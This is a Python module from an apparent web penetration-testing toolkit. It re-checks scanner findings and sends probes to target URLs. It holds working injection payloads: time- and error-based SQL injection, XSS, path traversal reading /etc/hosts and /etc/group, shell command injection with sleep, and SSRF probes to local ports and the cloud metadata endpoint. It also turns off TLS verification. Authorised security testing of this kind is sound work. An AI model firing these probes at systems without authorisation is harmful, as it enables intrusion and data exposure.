#!/usr/bin/env python3
"""
False Positive Verifier
------------------------
Double-checks findings from scanners before reporting to eliminate
false positives. Uses a second distinct payload/probe on each finding.

Strategies:
  • SQLi: re-verify with a second time-based probe + different sleep duration
  • XSS: re-verify unique marker is actually rendered in executable context
  • LFI: confirm multi-file pattern (not just one keyword match)
  • CMDi: re-test with different sleep duration
  • SSRF: attempt second distinct internal target
"""

import re
import time
import requests
from typing import List, Dict, Optional
from rich.console import Console

console = Console()


class FalsePositiveVerifier:
    """
    Verifies scanner findings with a second independent probe.
    Returns only confirmed findings.
    """

    def __init__(self, session=None, timeout: int = 12):
        self.timeout = timeout
        if session is not None:
            self.session = session
        else:
            self.session = requests.Session()
            self.session.headers["User-Agent"] = "WebPwnToolkit/2.0 (Authorized)"
            self.session.verify = False

    # ── SQLi Verification ─────────────────────────────────────────────

    def _verify_sqli_timebased(self, finding: Dict) -> bool:
        """Re-verify time-based SQLi with a different sleep duration."""
        url = finding.get("url", "")
        param = finding.get("parameter", "")
        method = finding.get("method", "GET").upper()

        # Use a different sleep value (7s) as second probe
        alt_payloads = [
            "' AND SLEEP(7)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(7)))a)--",
            "; WAITFOR DELAY '0:0:7'--",
            "' OR SLEEP(7)--",
        ]
        for payload in alt_payloads:
            try:
                t0 = time.time()
                if method == "POST":
                    resp = self.session.post(
                        url,
                        data={param: payload},
                        timeout=self.timeout + 10,
                        verify=False,
                    )
                else:
                    resp = self.session.get(
                        url,
                        params={param: payload},
                        timeout=self.timeout + 10,
                        verify=False,
                    )
                elapsed = time.time() - t0
                if elapsed >= 6.0:
                    return True
            except requests.Timeout:
                return True  # Timeout = sleep triggered
            except Exception:
                pass
        return False

    def _verify_sqli_error(self, finding: Dict) -> bool:
        """Re-verify error-based SQLi with a different payload."""
        url = finding.get("url", "")
        param = finding.get("parameter", "")
        alt = ["'\"--", "';--", "1 AND 1=1--", "1 AND 1=2--"]
        errors = [
            "sql syntax",
            "mysql_fetch",
            "ora-",
            "sqlite_",
            "unclosed quotation",
            "pg_query",
            "sqlstate",
        ]
        for payload in alt:
            try:
                resp = self.session.get(
                    url, params={param: payload}, timeout=self.timeout, verify=False
                )
                body = resp.text.lower()
                if any(e in body for e in errors):
                    return True
            except Exception:
                pass
        return False

    def verify_sqli(self, finding: Dict) -> bool:
        vuln_type = finding.get("type", "").lower()
        if "time" in vuln_type or "blind" in vuln_type:
            return self._verify_sqli_timebased(finding)
        return self._verify_sqli_error(finding)

    # ── XSS Verification ──────────────────────────────────────────────

    def verify_xss(self, finding: Dict) -> bool:
        """Re-verify XSS with a second unique marker payload."""
        import uuid

        url = finding.get("url", "")
        param = finding.get("parameter", "")
        method = finding.get("method", "GET").upper()
        marker = uuid.uuid4().hex[:8].upper()

        alt_payloads = [
            f"<img src=x onerror=alert('{marker}')>",
            f"<svg/onload=confirm('{marker}')>",
            f'">{marker}<script>alert(1)</script>',
        ]
        for payload in alt_payloads:
            try:
                if method == "POST":
                    resp = self.session.post(
                        url, data={param: payload}, timeout=self.timeout, verify=False
                    )
                else:
                    resp = self.session.get(
                        url, params={param: payload}, timeout=self.timeout, verify=False
                    )
                body = resp.text
                # Marker reflected AND in an executable context
                if marker in body:
                    idx = body.find(marker)
                    ctx = body[max(0, idx - 100) : idx + 100]
                    if any(
                        s in ctx
                        for s in ["onerror", "onload", "script", "svg", "alert"]
                    ):
                        return True
            except Exception:
                pass
        return False

    # ── LFI Verification ──────────────────────────────────────────────

    def verify_lfi(self, finding: Dict) -> bool:
        """Re-verify LFI with a second target file."""
        url = finding.get("url", "")
        param = finding.get("parameter", "")
        alt_paths = [
            "../../../etc/hosts",
            "../../../../etc/group",
            "../../windows/system32/drivers/etc/hosts",
        ]
        indicators = ["localhost", "127.0.0.1", "root:", "nobody:", "# hosts"]
        for path in alt_paths:
            try:
                resp = self.session.get(
                    url, params={param: path}, timeout=self.timeout, verify=False
                )
                if any(ind in resp.text for ind in indicators):
                    return True
            except Exception:
                pass
        return False

    # ── CMDi Verification ─────────────────────────────────────────────

    def verify_cmdi(self, finding: Dict) -> bool:
        """Re-verify CMDi with a different sleep value."""
        url = finding.get("url", "")
        param = finding.get("parameter", "")
        method = finding.get("method", "GET").upper()
        alt = ["; sleep 6", "| sleep 6", "$(sleep 6)", "& PING /n 6 127.0.0.1"]
        for payload in alt:
            try:
                t0 = time.time()
                if method == "POST":
                    resp = self.session.post(
                        url,
                        data={param: payload},
                        timeout=self.timeout + 8,
                        verify=False,
                    )
                else:
                    resp = self.session.get(
                        url,
                        params={param: payload},
                        timeout=self.timeout + 8,
                        verify=False,
                    )
                if time.time() - t0 >= 5.0:
                    return True
            except requests.Timeout:
                return True
            except Exception:
                pass
        return False

    # ── SSRF Verification ─────────────────────────────────────────────

    def verify_ssrf(self, finding: Dict) -> bool:
        """Re-verify SSRF with a second internal target."""
        url = finding.get("url", "")
        param = finding.get("parameter", "")
        alt_targets = [
            "http://127.0.0.1:22/",  # SSH
            "http://127.0.0.1:3306/",  # MySQL
            "http://169.254.169.254/latest/meta-data/hostname",
        ]
        indicators = ["SSH", "mysql_native_password", "hostname", "ec2"]
        for target in alt_targets:
            try:
                resp = self.session.get(
                    url, params={param: target}, timeout=self.timeout, verify=False
                )
                if any(ind.lower() in resp.text.lower() for ind in indicators):
                    return True
            except Exception:
                pass
        return False

    # ── Public interface ──────────────────────────────────────────────

    VERIFIERS = {
        "sql": "verify_sqli",
        "xss": "verify_xss",
        "lfi": "verify_lfi",
        "path": "verify_lfi",
        "cmd": "verify_cmdi",
        "command": "verify_cmdi",
        "ssrf": "verify_ssrf",
    }

    def verify(self, finding: Dict) -> bool:
        """
        Auto-detect finding type and run appropriate verifier.
        Returns True if finding is confirmed, False if likely false positive.
        """
        vuln_type = finding.get("type", "").lower()
        for key, method_name in self.VERIFIERS.items():
            if key in vuln_type:
                verifier = getattr(self, method_name)
                confirmed = verifier(finding)
                if not confirmed:
                    console.print(
                        f"  [dim yellow]⚠ FP filtered: {finding.get('type','')} "
                        f"@ {finding.get('parameter','')} "
                        f"— second probe did not confirm[/dim yellow]"
                    )
                return confirmed
        return True  # Unknown type — pass through

    def filter_findings(self, findings: List[Dict], verbose: bool = True) -> List[Dict]:
        """
        Filter a list of findings, removing likely false positives.
        Returns only confirmed findings.
        """
        if not findings:
            return findings

        confirmed = []
        fp_count = 0

        console.print(
            f"  [dim]→ FP verification: checking {len(findings)} finding(s)...[/dim]"
        )

        for f in findings:
            if self.verify(f):
                confirmed.append(f)
            else:
                fp_count += 1

        if fp_count and verbose:
            console.print(
                f"  [yellow]⚠ {fp_count} likely false positive(s) removed[/yellow]"
            )
        if confirmed:
            console.print(
                f"  [green]✅ {len(confirmed)} confirmed finding(s) after FP check[/green]"
            )

        return confirmed
